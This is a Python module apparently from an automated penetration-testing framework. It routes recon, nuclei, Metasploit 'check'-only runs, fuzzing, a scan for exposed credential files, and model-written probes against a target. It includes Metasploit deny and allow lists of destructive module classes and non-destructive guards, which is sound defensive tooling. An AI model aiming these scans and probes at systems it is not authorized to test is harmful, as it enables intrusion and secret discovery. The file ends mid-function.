"""
vectors.py -- the SHARED fact-finding / attack-vector legs available to ALL THREE modes
(Operator, ExploitGym, Red-Team). Every mode dispatches through here, so none is blind to a class the
others can see; they differ ONLY in the doctrine wrapper each puts around dispatch():
    Operator   -> non-destructive guard
    ExploitGym -> + audit
    Red-Team   -> + authorization/scope guard

Vectors: web (HTTP), recon (nmap), supply_chain (syft/grype SBOM), static (semgrep), fuzz (afl/honggfuzz
presence+run), misconfig (exposed-file/k8s scan), rag (offline CVE lookup). Kali-backed legs shell into
the kali-linux distro; web uses requests. Each returns {status, body, ...} + the leg's structured data.
"""
from __future__ import annotations

import os, re, shlex, subprocess, sys, json, glob

WSL_DISTRO = os.environ.get("AEGIS_KALI_DISTRO", "kali-linux")

# ARTEX-port B1: activate the noise governor if AEGIS_NOISE_PROFILE is set. All three modes dispatch
# through this module, so this one hook paces target traffic everywhere. Default-off -> no-op, no patch.
try:
    import noise as _noise          # operator/ is on sys.path for all three modes
    _noise.install()
except Exception:
    pass


def _kali(cmd: str, timeout: int = 600) -> str:
    """Run a command in the Kali toolset. PLATFORM SHIM (see memory nested-wsl-shim): when this code
    is ALREADY running inside a Linux distro (sys.platform != 'win32' -- e.g. the in-Kali ExploitGym
    HTTP path, where the Windows host can't reach the target's --internal network), run `bash -lc`
    locally; there is no wsl.exe inside the distro, so a bare ['wsl',...] call would fail with Errno 2
    and return a silent empty result. On Windows, wrap in `wsl -d <distro>` as before."""
    try:
        if sys.platform == "win32":
            argv = ["wsl", "-d", WSL_DISTRO, "-u", "root", "--", "bash", "-lc", cmd]
        else:
            argv = ["bash", "-lc", cmd]
        # encoding+errors MUST be set: on Windows text=True defaults to cp1252 and a reader thread CRASHES
        # (UnicodeDecodeError) on any non-cp1252 byte from a Kali tool, silently losing that tool's output
        # and degrading hunt/Planner runs. utf-8 + errors=replace matches the co-pilot's t_run_command.
        p = subprocess.run(argv, capture_output=True, text=True, timeout=timeout,
                           encoding="utf-8", errors="replace")
        return (p.stdout or "")
    except Exception as e:
        return f"[kali error: {e}]"


# TOOL-CONCURRENCY GATE (memory safety for PARALLEL hunts, e.g. agent_hunt.MultiAgentHunt): external tool
# shellouts (nuclei/msf/nmap/katana...) are the RAM-heavy part of a probe. When N worker threads each fire a
# Kali subprocess at once a small box OOMs / gets reaped. AEGIS_TOOL_CONCURRENCY=K caps CONCURRENT tool
# subprocesses to K across ALL threads while lightweight network probes still fan out freely. Unset/0 =
# unbounded (legacy, unchanged). Lazily built, thread-safe; the cap is read once at first tool call.
import threading as _threading
_TOOL_SEM = None
_TOOL_SEM_INIT = False
_TOOL_SEM_LOCK = _threading.Lock()

def _tool_gate():
    """Return a bounded Semaphore (AEGIS_TOOL_CONCURRENCY>0) or None (unbounded/legacy)."""
    global _TOOL_SEM, _TOOL_SEM_INIT
    if not _TOOL_SEM_INIT:
        with _TOOL_SEM_LOCK:
            if not _TOOL_SEM_INIT:
                try:
                    _n = int(os.environ.get("AEGIS_TOOL_CONCURRENCY", "0"))
                except Exception:
                    _n = 0
                _TOOL_SEM = _threading.Semaphore(_n) if _n > 0 else None
                _TOOL_SEM_INIT = True
    return _TOOL_SEM

# G49: route a TOOL-bearing command through the multi-distro backend (Kali present -> run there; portable-
# missing -> install into Kali; non-portable/missing -> BlackArch(Arch) container). This is what makes the
# AutoLoop actually USE the Kali<->Arch alternation for its external tools (nmap/semgrep/nuclei/msf), instead
# of running everything in Kali and silently degrading when a tool only exists in BlackArch. Any router error
# (or AEGIS_TOOL_ROUTER=0) falls back to plain _kali so behaviour never regresses.
def _route_line(tool, full_cmd, timeout=600):
    sem = _tool_gate()
    if sem is None:
        return _route_line_impl(tool, full_cmd, timeout)
    with sem:                                  # cap concurrent tool subprocesses (parallel-hunt RAM safety)
        return _route_line_impl(tool, full_cmd, timeout)

def _route_line_impl(tool, full_cmd, timeout=600):
    if os.environ.get("AEGIS_TOOL_ROUTER", "1") == "0":
        return _kali(full_cmd, timeout)
    try:
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        import distro_backend as _DB
        backend = _DB.route(tool)
        if backend == "kali":
            return _kali(full_cmd, timeout)
        if backend == "install":
            try:
                import kali_tool_extend as _KTE
                res = _KTE.install(tool)
            except Exception as e:
                res = {"status": "failed", "err": str(e)}
            if res.get("status") in ("installed", "present"):
                return _kali(full_cmd, timeout)
            _rc, _out, _err = _DB.run_in_blackarch(full_cmd, ensure_tools=[tool], timeout=timeout)
            return _out or _err
        _rc, _out, _err = _DB.run_in_blackarch(full_cmd, ensure_tools=[tool], timeout=timeout)  # non-portable -> BlackArch
        return _out or _err
    except Exception as e:
        return _kali(full_cmd, timeout)   # router unavailable -> Kali as before


def _tool_run(tool, args, timeout=600):
    """Run a single external `tool args` line via the distro router (G49). shlex-safe args are the caller's job."""
    return _route_line(tool, f"{tool} {args}", timeout)


def web(move, ctx):
    import requests
    try:
        requests.packages.urllib3.disable_warnings()
    except Exception:
        pass
    sf = ctx.get("session_for_role")
    sess = sf(move.get("role", "owner")) if sf else requests.Session()
    base = ctx.get("base", "https://localhost:8443")
    method = (move.get("method") or "GET").upper()
    path = move.get("path") or move.get("surface") or "/"
    url = base + (path if path.startswith("/") else "/" + path)
    r = sess.request(method, url, json=move.get("body"), verify=False, timeout=20)
    return {"status": r.status_code, "body": (r.text or "")[:2000]}


def recon(move, ctx):
    t = move.get("target") or move.get("host") or ""
    out = _tool_run("nmap", f"-sV -T4 --top-ports 50 {shlex.quote(t)} 2>/dev/null | head -40", 300) or "nmap missing"  # G49 routed
    return {"status": 200, "body": out[:4000]}


def _osv_deps(move, ctx):
    """Collect (ecosystem, name, version) triples to range-match against OSV. Sources, first non-empty:
    move['deps'], ctx['deps'], ctx['manifest']['deps'] -- each a list of {ecosystem,name,version} dicts
    (aliases eco/package/pkg/ver accepted) or [eco, name, ver] triples. Incomplete entries are skipped."""
    raw = ((move or {}).get("deps") or (ctx or {}).get("deps")
           or ((ctx or {}).get("manifest") or {}).get("deps") or [])
    out = []
    for d in raw:
        if isinstance(d, dict):
            eco = d.get("ecosystem") or d.get("eco") or ""
            name = d.get("name") or d.get("package") or d.get("pkg") or ""
            ver = d.get("version") or d.get("ver") or ""
        elif isinstance(d, (list, tuple)) and len(d) >= 3:
            eco, name, ver = d[0], d[1], d[2]
        else:
            continue
        if eco and name and ver:
            out.append((str(eco), str(name), str(ver)))
    return out


def _osv_pass(move, ctx):
    """COVERAGE engine: range-precise dependency/plugin advisories via OSV.dev -- the NO-IMAGE, black-box
    lane (detected deps from the fingerprint / SBOM / an exposed manifest), complementing the grype image
    scan. OSV range-matches the version server-side, so a patched version is not false-flagged. Offline-safe
    (never raises), gated AEGIS_OSV=0. Returns a list of per-package advisory hits, or None."""
    if os.environ.get("AEGIS_OSV", "1") == "0":
        return None
    deps = _osv_deps(move, ctx)
    if not deps:
        return None
    try:
        import osv_lookup
    except Exception:
        try:
            import sys as _sys
            _rag = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "rag")
            if _rag not in _sys.path:
                _sys.path.insert(0, _rag)
            import osv_lookup
        except Exception:
            return None
    try:
        hits = osv_lookup.scan_manifest(deps)
    except Exception:
        return None
    out = [{"ecosystem": e, "name": n, "version": v, "advisories": adv, "count": len(adv)}
           for (e, n, v), adv in hits.items()]
    return out or None


def supply_chain(move, ctx):
    from supply_chain_scan import scan_image
    # SCAFFOLD direction: scan the STACK image for vulnerable deps. If the seed didn't name an image,
    # fall back to the configured mirror image (AEGIS_MIRROR_IMAGE) -> the ctx base host -> so the
    # scaffold CVE/SBOM pass runs AUTONOMOUSLY instead of scanning nothing (the reason a scaffold run
    # can silently report 0 deps). grype is the ground-truth oracle (version-range matching).
    image = (move.get("image") or move.get("target")
             or os.environ.get("AEGIS_MIRROR_IMAGE") or "")
    res = scan_image(image)
    # CVE CONFIRMATION (KEV/PoC/EPSS -> confidence, cuts false positives) is OPT-IN via ctx.cve_confirm
    # and runs ONLY in the co-pilot + benchmark legs. The RED-TEAM leg deliberately does NOT get it: it
    # is a conservative admin-track evidence pass, not live exploitation -- red-team instead goes as DEEP
    # as it can, non-destructively, through its own escalation/pivot.
    if (ctx or {}).get("cve_confirm"):
        try:
            from supply_chain_scan import confirm_all
            res = confirm_all(res, base=(ctx or {}).get("base"))
        except Exception:
            pass
    body = f"{res.get('count', 0)} HIGH/CRITICAL deps"
    out = {"status": 200, "supply_chain": res, "body": body}
    # NO-IMAGE lane: range-precise dependency/plugin advisories via OSV on the FINGERPRINTED deps
    # (complements the grype image scan; both feed the same oracle). Additive + offline-safe.
    osv = _osv_pass(move, ctx)
    if osv:
        n_adv = sum(d["count"] for d in osv)
        res["osv"] = osv
        res["osv_count"] = n_adv
        out["osv"] = osv
        out["body"] = body + f" + {n_adv} OSV dependency advisory(ies) on {len(osv)} package(s)"
        if n_adv:
            out["status"] = 300   # leads found (same convention as the nuclei leg)
    return out


def static(move, ctx):
    p = move.get("path_in_kali") or move.get("target") or ""
    out = _tool_run("semgrep", f"--config auto --json {shlex.quote(p)} 2>/dev/null | head -c 8000", 300) or "semgrep missing"  # G49 routed
    return {"status": 200, "body": out[:4000]}


def fuzz(move, ctx):
    # NB: a `for x in ... $x ...` shell loop does NOT survive the Windows->WSL->bash arg
    # marshalling (the loop var comes back empty), so name each fuzzer explicitly.
    checks = "; ".join(
        f"(command -v {t} >/dev/null 2>&1 && echo {t}:present || echo {t}:MISSING)"
        for t in ("afl-fuzz", "honggfuzz", "radamsa")
    )
    out = _kali(checks)
    return {"status": 200, "body": out.strip() or "(no fuzzers)"}


def ossfuzz(move, ctx):
    """GREY-BOX leg -- THE FUZZER (operator/fuzzer.py): coverage-guided fuzzing of the mirror's OWN
    buildable source via the OSS-Fuzz tooling, contained in Kali/Docker. Distinct from the black-box
    `fuzz` leg above (which probes the running mirror over the wire). A move names a scaffolded+built
    `project` and `fuzzer`; this runs it for a bounded time and triages crashes into candidate findings
    (each verified only when it REPRODUCES). Offline-safe: reports readiness if nothing is built yet."""
    try:
        import fuzzer
    except Exception as e:
        return {"status": -1, "body": f"[fuzzer import error] {e}"}
    project = move.get("project") or move.get("target")
    fz = move.get("fuzzer") or move.get("mechanism")
    if not project or not fz:
        return {"status": 200, "body": f"grey-box fuzzer readiness: {fuzzer.check()}",
                "ossfuzz": {"note": "supply move['project'] + move['fuzzer'] (scaffold+build first)"}}
    seconds = int(move.get("seconds") or ctx.get("fuzz_seconds") or 120)
    engine = move.get("engine") or "libfuzzer"
    r = fuzzer.run(project, fz, seconds=seconds, engine=engine)
    if r.get("error"):
        return {"status": 200, "ossfuzz": r, "body": f"fuzz not run: {r['error']}"}
    # board interprets each unique crash by default (root cause / severity / exploitability / fix);
    # set move['interpret']=False to skip the board round and just reproduce.
    tri = fuzzer.triage(project, fz, board=bool(move.get("interpret", True)))
    crashes = tri.get("reproduced", 0)
    return {"status": 200 if crashes == 0 else 500, "ossfuzz": {**r, **tri},
            "findings": tri.get("findings", []),
            "body": f"{tri.get('crash_count',0)} crash(es), {crashes} reproduced on {project}:{fz}"}


def nuclei(move, ctx):
    """A1 (corpus roadmap) -- nuclei as a PRE-FILTERED ENRICHMENT pass, NOT 10k raw loop moves. Runs
    `nuclei -jsonl` against the target's AUTHENTICATED surface (bearer/cookie lifted from the B0 session)
    and returns each template match as a LEAD (confirmation #1) -- never a verified finding on its own.
    The board's guardrails, enforced here so the ~40-move budget's novel/0-day axis is never flooded:
      * SEVERITY GATE: >= medium only (default medium,high,critical) -- drops the info/low noise.
      * STACK SCOPE: -tags from the fingerprinted stack (ctx['stack']) so only on-stack templates run.
      * NON-DESTRUCTIVE: -etags dos,intrusive,fuzzing,network so no template can crash/DoS the target.
      * ONE INFO-MOVE: the whole scan is a single dispatch -> the loop counts it once; the matches are
        LEADS the loop/oracle can then chase, promoted to a finding only on an INDEPENDENT 2nd oracle.
    Offline-safe: nuclei absent -> graceful skip. Kill-switch: AEGIS_NUCLEI=0."""
    import json as _json
    if str(os.environ.get("AEGIS_NUCLEI", "1")).lower() in ("0", "false", "no", "off"):
        return {"status": 200, "body": "[nuclei] disabled (AEGIS_NUCLEI=0)",
                "nuclei": {"scanned": False, "leads": [], "note": "disabled"}, "nuclei_leads": 0}
    base = (ctx or {}).get("base") or move.get("target") or os.environ.get("AEGIS_TARGET") or "https://localhost:8443"
    sev = move.get("severity") or os.environ.get("AEGIS_NUCLEI_SEVERITY", "medium,high,critical")
    # STACK SCOPE: prefer an explicit move['tags'], else derive from the fingerprinted stack in ctx.
    tags = move.get("tags")
    if not tags:
        stack = (ctx or {}).get("stack") or []
        tags = ",".join(sorted({str(t).strip().lower() for t in stack if str(t).strip()})) if stack else ""
    # AUTHENTICATED surface: lift the bearer header + cookie jar from the (B0-hardened) role session.
    hdr_args = ""
    try:
        sf = (ctx or {}).get("session_for_role")
        if sf:
            s = sf(move.get("role", "owner"))
            auth = None
            try:
                auth = s.headers.get(os.environ.get("AEGIS_AUTH_HEADER", "Authorization"))
            except Exception:
                auth = None
            if auth:
                hdr_args += " -H " + shlex.quote((os.environ.get("AEGIS_AUTH_HEADER", "Authorization")) + ": " + str(auth))
            try:
                cookie = "; ".join(f"{c.name}={c.value}" for c in s.cookies)
            except Exception:
                cookie = ""
            if cookie:
                hdr_args += " -H " + shlex.quote("Cookie: " + cookie)
    except Exception:
        pass
    seconds = int(move.get("seconds") or (ctx or {}).get("nuclei_seconds") or 240)
    rl = int(move.get("rate_limit") or os.environ.get("AEGIS_NUCLEI_RL", "150"))
    conc = int(move.get("concurrency") or os.environ.get("AEGIS_NUCLEI_C", "25"))
    # A2 SYNTHESIZER hook: a move may target SPECIFIC templates by id (nuclei names CVE templates by their
    # CVE-id), so a deterministic CVE->template mapping runs exactly that template instead of the tag sweep.
    tids = move.get("template_ids") or move.get("templates")
    if isinstance(tids, str):
        tids = [t.strip() for t in tids.split(",") if t.strip()]
    if tids:
        tag_arg = " " + " ".join("-id " + shlex.quote(str(t)) for t in tids)
    else:
        tag_arg = (" -tags " + shlex.quote(tags)) if tags else ""
    # -duc: no update-check (offline). -etags: hard non-destructive exclude. -silent+-jsonl: parseable.
    cmd = (f"command -v nuclei >/dev/null 2>&1 && nuclei -u {shlex.quote(base)} -jsonl -silent -nc -duc "
           f"-severity {shlex.quote(sev)}{tag_arg} -etags dos,intrusive,fuzzing,network "
           f"-timeout 10 -retries 1 -rate-limit {rl} -c {conc}{hdr_args} 2>/dev/null || echo '__NO_NUCLEI__'")
    out = _route_line("nuclei", cmd, seconds + 30)   # G49: Kali if present, else install/BlackArch(Arch)
    if "__NO_NUCLEI__" in out:
        return {"status": 200, "body": "[nuclei] not installed in the Kali toolset (apt install nuclei)",
                "nuclei": {"scanned": False, "leads": [], "note": "nuclei missing"}, "nuclei_leads": 0}
    leads = []
    for line in out.splitlines():
        line = line.strip()
        if not line or not line.startswith("{"):
            continue
        try:
            m = _json.loads(line)
        except Exception:
            continue
        info = m.get("info") or {}
        cls = info.get("classification") or {}
        leads.append({
            "template_id": m.get("template-id") or m.get("templateID"),
            "name": info.get("name"),
            "severity": (info.get("severity") or "").lower(),
            "matched_at": m.get("matched-at") or m.get("matched_at") or m.get("host"),
            "type": m.get("type"),
            "tags": info.get("tags"),
            "cve": (cls.get("cve-id") or cls.get("cve_id") or [None])[0]
                   if isinstance(cls.get("cve-id") or cls.get("cve_id"), list)
                   else (cls.get("cve-id") or cls.get("cve_id")),
        })
    nd = {"scanned": True, "surface": base, "severity": sev, "tags": tags,
          "leads": leads, "matches_total": len(leads)}
    return {"status": 200 if not leads else 300, "body": f"nuclei: {len(leads)} lead(s) (>= {sev})",
            "nuclei": nd, "nuclei_leads": len(leads)}


_MSF_DENY = ("/dos/", "auxiliary/dos", "auxiliary/admin", "auxiliary/fuzzers", "auxiliary/spoof",
             "post/", "payload/", "encoder/", "nop/", "evasion/")
_MSF_ALLOW_PREFIX = ("auxiliary/scanner/",)   # read-only detection scans; extended by AEGIS_MSF_ALLOW


def _msf_allowed(module: str, action: str):
    """A3 non-destructive policy (board-locked): ALLOWLIST, not denylist. Returns (ok, action, why).
      * auxiliary/scanner/* -> a detection scan ('run') is allowed (read-only).
      * exploit/* -> ONLY 'check' is allowed (never fire a payload / get a session) -> proof-only.
      * an explicit reviewed prefix in AEGIS_MSF_ALLOW (CSV) is allowed for 'check'.
      * everything else, and anything on the hard denylist (dos/admin/fuzzers/post/payload/...), is REFUSED.
    Stop-at-beacon doctrine: no exploit run, no session, no persistence -- a `check` is a boolean probe."""
    m = (module or "").strip().lower()
    if not m:
        return False, action, "no module"
    if any(d in m for d in _MSF_DENY):
        return False, action, "denylisted module class (destructive/post/persistence)"
    extra = tuple(p.strip().lower() for p in os.environ.get("AEGIS_MSF_ALLOW", "").split(",") if p.strip())
    if m.startswith("auxiliary/scanner/"):
        return True, "run", "auxiliary/scanner (read-only detection)"
    if m.startswith("exploit/"):
        return True, "check", "exploit module -> CHECK-only (proof, no payload)"
    if any(m.startswith(p) for p in (_MSF_ALLOW_PREFIX + extra)):
        return True, "check", "reviewed allowlisted prefix"
    return False, action, "not on the allowlist (auxiliary/scanner, exploit-check, or AEGIS_MSF_ALLOW)"


def msf(move, ctx):
    """A3 (corpus roadmap) -- Metasploit as a PROOF-ONLY loop action. Runs an allowlisted MSF module in a
    strictly non-destructive mode (auxiliary/scanner detection, or an exploit module's `check` -- NEVER a
    payload-bearing `exploit`/`run`, never a session, never persistence -> stop-at-beacon doctrine). An MSF
    positive is a LEAD (confirmation #1), promoted to a finding only on our INDEPENDENT 2nd oracle -- same
    contract as the nuclei leg. Optional snapshot->run->restore harness when move['snapshot'] is set and
    mirror_snapshot is available. Offline-safe: msfconsole absent -> graceful skip. Kill-switch AEGIS_MSF=0."""
    import json as _json, re as _re
    from urllib.parse import urlparse as _up
    if str(os.environ.get("AEGIS_MSF", "1")).lower() in ("0", "false", "no", "off"):
        return {"status": 200, "body": "[msf] disabled (AEGIS_MSF=0)",
                "msf": {"ran": False, "verdict": "rejected", "note": "disabled"}, "msf_verified": False}
    module = move.get("module") or ""
    action_req = (move.get("msf_action") or move.get("action_kind") or "check").lower()
    ok, action, why = _msf_allowed(module, action_req)
    if not ok:
        return {"status": 0, "blocked": "msf policy: " + why, "body": "[msf] refused: " + why,
                "msf": {"ran": False, "verdict": "rejected", "module": module, "policy": why}, "msf_verified": False}
    base = (ctx or {}).get("base") or move.get("target") or os.environ.get("AEGIS_TARGET") or "https://localhost:8443"
    pr = _up(base if str(base).startswith("http") else "https://" + str(base))
    rhost = move.get("rhost") or pr.hostname or "127.0.0.1"
    rport = move.get("rport") or pr.port or (443 if pr.scheme == "https" else 80)
    ssl = "true" if pr.scheme == "https" else "false"
    opts = dict(move.get("options") or {})
    # NON-DESTRUCTIVE hard guard: never allow a payload/session/persistence option through.
    for bad in list(opts):
        if str(bad).lower() in ("payload", "session", "disablepayloadhandler", "autorunscript", "initialautorunscript"):
            opts.pop(bad, None)
    snap = move.get("snapshot")
    snapped = False
    if snap:
        try:
            import mirror_snapshot
            mirror_snapshot.snapshot(snap); snapped = True
        except Exception:
            snapped = False
    # build the resource script (set options, then a single check/run, then exit -- no exploit, no payload)
    lines = ["setg PROMPT ''", "use " + module, "set RHOSTS %s" % rhost, "set RPORT %s" % rport]
    if pr.scheme in ("http", "https"):
        lines += ["set SSL %s" % ssl]
    for k, v in opts.items():
        lines.append("set %s %s" % (k, v))
    lines += [action, "exit"]
    rc = "\n".join(lines)
    seconds = int(move.get("seconds") or (ctx or {}).get("msf_seconds") or 180)
    # write the rc in the Kali sandbox, run headless (-q quiet, -n no-db is fine), capture, then delete it.
    b64 = __import__("base64").b64encode(rc.encode()).decode()
    cmd = (f"command -v msfconsole >/dev/null 2>&1 && "
           f"RC=$(mktemp /tmp/aegis-msf-XXXX.rc) && echo {b64} | base64 -d > \"$RC\" && "
           f"timeout {seconds} msfconsole -q -r \"$RC\" 2>/dev/null; rm -f \"$RC\" || echo '__NO_MSF__'")
    out = _route_line("msfconsole", cmd, seconds + 30)   # G49: Kali if present, else install/BlackArch(Arch)
    if snapped:
        try:
            import mirror_snapshot
            mirror_snapshot.restore(snap)
        except Exception:
            pass
    if "__NO_MSF__" in out:
        return {"status": 200, "body": "[msf] msfconsole not installed in the Kali toolset",
                "msf": {"ran": False, "verdict": "rejected", "note": "msfconsole missing"}, "msf_verified": False}
    lo = out.lower()
    positive = False
    signal = ""
    if action == "check":
        # Msf CheckCode: Vulnerable / Appears = positive; Safe / Unknown / Detected(weak) = not proof
        if _re.search(r"the target (is|appears to be) vulnerable|checkcode::(vulnerable|appears)|\bis vulnerable\b", lo):
            positive = True; signal = "check=vulnerable"
        elif "appears to be vulnerable" in lo:
            positive = True; signal = "check=appears"
    else:  # auxiliary/scanner run: positive if it reported a hit ([+]) about the host
        hits = [ln for ln in out.splitlines() if "[+]" in ln]
        if hits:
            positive = True; signal = "scanner:%d hit(s)" % len(hits)
    md = {"ran": True, "module": module, "action": action, "rhost": rhost, "rport": rport,
          "positive": positive, "signal": signal, "snapshot": bool(snapped),
          "verdict": "lead" if positive else "rejected", "tail": out[-600:]}
    return {"status": 300 if positive else 200, "body": ("msf %s -> %s" % (module, signal or "no proof")),
            "msf": md, "msf_lead": positive}


def misconfig(move, ctx):
    p = move.get("path_in_kali") or move.get("target") or "/"
    out = _kali(f"find {shlex.quote(p)} -maxdepth 4 \\( -name .git -o -name .env -o -name '*.pem' -o -name 'config.y*ml' -o -name .kube -o -name .aws \\) 2>/dev/null | head -20", 120)
    return {"status": 200, "body": out or "(no exposed sensitive paths)"}


def rag(move, ctx):
    q = move.get("query") or move.get("payload") or ""
    out = _kali(f"python3 /opt/aegis-rag/rag_query.py --json --k 5 {shlex.quote(q)} 2>/dev/null | tail -1", 120)
    return {"status": 200, "body": out[:2000]}


_NC_MARKER = re.compile(r"(?:contains?|body~|EXPECT|CANARY|LEAK|includes?)\s*[:=]?\s*['\"]?([^\s'\"]{1,})", re.I)
# status/protocol/boilerplate words are NOT proof markers -- a marker must be meaningful body content.
_NC_TRIVIAL = {"http", "https", "true", "false", "pass", "fail", "none", "null", "body",
               "json", "html", "text", "okay", "http200", "200ok", "status", "response"}


def _nc_trivial_marker(tok):
    t = (tok or "").lower()
    return (not t) or len(t) < 4 or t.isdigit() or t in _NC_TRIVIAL


def _novelcode_http_verdict(oracle_txt, check_verdict, status, body,
                            baseline_status=None, baseline_body=None):
    """PURE real-witness verdict for a novel-code HTTP probe. Returns (verified: bool, notes: str).

    A novel-code probe is VERIFIED only if EVERY guard holds -- this kills the observed FP class where
    the model-written oracle self-verifies on trivial evidence (round-2 triage found alg:none-JWT
    'body~a', an XXE probe that was RATE-LIMITED to 429 and marked pass, and a 'body~at' on normal data):
      (1) check_oracle passed AND
      (2) the response is 2xx -- a 429/4xx/5xx is NEVER proof (kills the 429-marked-pass), AND
      (3) the oracle carries an EXPLICIT distinguishing observable: a SQL SELECT (db-witness) or a
          >=4-char body marker -- a bare status/2xx 'pass' self-verifies (see novel_code.py:133), AND
      (4) DIFFERENTIAL vs a nonexistent-path baseline: not the SPA/history catch-all (same status+body),
          and the marker must be ABSENT from that baseline (a marker present there is ambient content,
          not foothold proof -- kills 'a'/'at').
    Any baseline arg left None means "not fetched" -> the differential guards that need it are skipped
    conservatively, but (1)-(3) still apply."""
    notes = ""
    if check_verdict != "pass":
        return False, "oracle did not pass"
    if not (200 <= (status or 0) < 300):
        return False, f"non-2xx status {status} is never a novel-code pass"
    has_select = bool(re.search(r"SELECT\b", oracle_txt or "", re.I))
    m = _NC_MARKER.search(oracle_txt or "")
    tok = m.group(1) if m else None
    if _nc_trivial_marker(tok):
        tok = None                                    # a status/protocol/short word is not a proof marker
    if not (has_select or tok):
        return False, "weak-oracle: no SELECT and no meaningful body marker (bare-status self-verify rejected)"
    if baseline_status is not None and baseline_body is not None:
        if baseline_status == status and (baseline_body or "") == (body or ""):
            return False, "spa_fallback (2xx identical to nonexistent-path baseline)"
        if tok and tok in (baseline_body or ""):
            return False, f"ambient-marker ('{tok[:20]}' present in nonexistent-path baseline)"
    return True, notes or "real-witness pass"


def probe(move, ctx):
    """NOVEL-CODE leg -- run a coder-WRITTEN probe (the board->code-bench 'bridge/foothold' path)
    NON-DESTRUCTIVELY against the contained mirror and evaluate ITS OWN oracle, so the loop can prove
    or discard it. Reuses test_suggestions' guard + curl-replayer + prose-oracle so novel code runs
    through the SAME established, guarded pipeline the co-pilot already uses; like grype/ossfuzz, the
    leg carries its own ground-truth (`probe_verified`). Two shapes:
      * HTTP probe (curl/http in the code) -> replayed as an authenticated request to ctx['base'] (the
        contained twin), then the prose ORACLE (status/body/SELECT) is evaluated.
      * shell/python probe -> run in the CONTAINED Kali sandbox (bounded timeout), stdout captured;
        a SELECT oracle (if any) is checked, else pass on a clean, non-empty, non-error run.
    Master kill-switch: AEGIS_NOVEL_CODE=0 disables execution (stages the code instead)."""
    code = move.get("code") or ""
    oracle_txt = move.get("oracle") or move.get("expected_oracle") or ""
    # FORCE the probe to hit the ACTUAL target. The code bench routinely hardcodes the mirror default
    # (localhost:8443) or a placeholder host regardless of the stated base; the curl path rebinds, but a
    # PYTHON probe runs as-written and would hit the wrong host. Rewrite any absolute URL's scheme+host+port
    # in the code to ctx base (path/query preserved), so both paths execute against the real target.
    _pbase = (ctx or {}).get("base")
    if _pbase and code and "://" in code:
        import re as _re2
        code = _re2.sub(r'https?://[A-Za-z0-9_.\-]+(?::\d+)?', _pbase.rstrip("/"), code)
    if os.environ.get("AEGIS_NOVEL_CODE", "1") == "0":
        return {"status": 0, "blocked": "novel-code execution disabled (AEGIS_NOVEL_CODE=0)",
                "body": "[staged, not executed]", "probe": {"code": code[:400], "staged": True}}
    if not code.strip():
        return {"status": 200, "body": "[probe: no code written]", "probe": {"staged": True}}
    try:
        import test_suggestions as TS               # reuse the established guard/replayer/oracle
    except Exception as e:
        return {"status": -1, "body": f"[probe: test_suggestions unavailable] {e}"}
    ok, why = TS.guard(code)                          # NON-DESTRUCTIVE doctrine (plant/read, never erase)
    if not ok:
        return {"status": 0, "blocked": why, "body": why, "probe": {"code": code[:400]}}
    base = (ctx or {}).get("base") or TS.BASE
    req = None
    try:
        req = TS.parse_curl(code)
    except Exception:
        req = None
    if req:                                          # HTTP-shaped probe -> replay against the twin
        try:
            import requests
            sf = (ctx or {}).get("session_for_role")
            sess = sf(move.get("role", "owner")) if sf else requests.Session()
            try:
                sess.verify = False
            except Exception:
                pass
            url = base.rstrip("/") + (req["path"] if req["path"].startswith("/") else "/" + req["path"])
            kw = {"timeout": 20, "headers": req["headers"] or None, "verify": False}
            if req["data"]:
                import json as _j
                try:
                    kw["json"] = _j.loads(req["data"])
                except Exception:
                    kw["data"] = req["data"]
            resp = sess.request(req["method"], url, **kw)
        except Exception as e:
            return {"status": -1, "body": f"[probe run error] {e}", "probe": {"code": code[:400]}}
        verdict, notes, _dbc = TS.check_oracle(oracle_txt, resp, sess)   # X: check_oracle now returns db_confirmed
        # Real-witness guard (round-2 trust fix): fetch a nonexistent-path baseline once, then decide
        # with the pure _novelcode_http_verdict (2xx-only + explicit marker/SELECT + baseline differential).
        b_status = b_body = None
        if verdict == "pass" and 200 <= resp.status_code < 300:
            try:
                import uuid as _uuid
                bpath = base.rstrip("/") + "/zz-nonexistent-" + _uuid.uuid4().hex[:10]
                bresp = sess.request("GET", bpath, timeout=15, verify=False)
                b_status, b_body = bresp.status_code, (bresp.text or "")
            except Exception:
                pass
        strong, vnotes = _novelcode_http_verdict(
            oracle_txt, verdict, resp.status_code, (resp.text or ""), b_status, b_body)
        if not strong and verdict == "pass":
            notes = (notes or "") + " | " + vnotes           # record WHY a check_oracle pass was rejected
        # #4 deceptive-target robustness: label the receipt with a deception verdict derived from the
        # negative-control (nonexistent-path baseline) differential. 'clean' = a real differential signal;
        # 'deceptive' = a check_oracle pass that collided with the benign baseline (SPA-fallback / ambient
        # marker -- the target answers success to anything); 'untested' = passed but no baseline fetched.
        # Purely advisory labelling: `strong` already gates the verdict -- this just carries the trust
        # signal into oracle_receipt so the hash-chain fold can downgrade confidence.
        if strong:
            _dec = "clean"
        elif verdict == "pass" and ("spa_fallback" in vnotes or "ambient-marker" in vnotes):
            _dec = "deceptive"
        elif verdict == "pass" and b_status is None:
            _dec = "untested"
        else:
            _dec = ""
        return {"status": resp.status_code, "body": (resp.text or "")[:2000],
                "probe": {"kind": "http", "verdict": "pass" if strong else "fail",
                          "notes": notes, "code": code[:400], "deception": _dec},
                "probe_verified": strong, "deception": _dec}
    # non-HTTP probe: run in the contained sandbox, bounded, then check a SELECT oracle if present.
    import time as _time
    seconds = int(move.get("seconds") or (ctx or {}).get("probe_seconds") or 45)
    runner = "python3 -c" if re.search(r"\b(import|def |print\()", code) else "bash -lc"
    _t0 = _time.time()
    out = _kali(f"timeout {seconds} {runner} {shlex.quote(code)} 2>&1 | head -c 4000", seconds + 15)
    dur = _time.time() - _t0
    sel = re.search(r"(SELECT\b.+?;)", oracle_txt, re.I | re.S)
    verified = False
    notes = f"exit-captured; stdout={out[:120]!r}"
    if sel:
        try:
            db_out = TS.db(sel.group(1))
            verified = bool(db_out) and not db_out.startswith("[db error")
            notes = f"db-witness -> {db_out[:120]}"
        except Exception as e:
            notes = f"[db oracle error] {e}"
    else:
        # X: no weak "clean run" pass (the old `error not in out[:40]` was FP-prone). A non-HTTP probe must
        # declare an EXPLICIT oracle form:
        #  - CANARY/EXPECT/contains <marker>: the exact marker MUST appear in stdout (ran/exfil'd proof)
        #  - TIME>=<sec>: the run took at least that long (time-blind side-channel)
        #  - else -> NOT verified (inconclusive), never a bare-output pass.
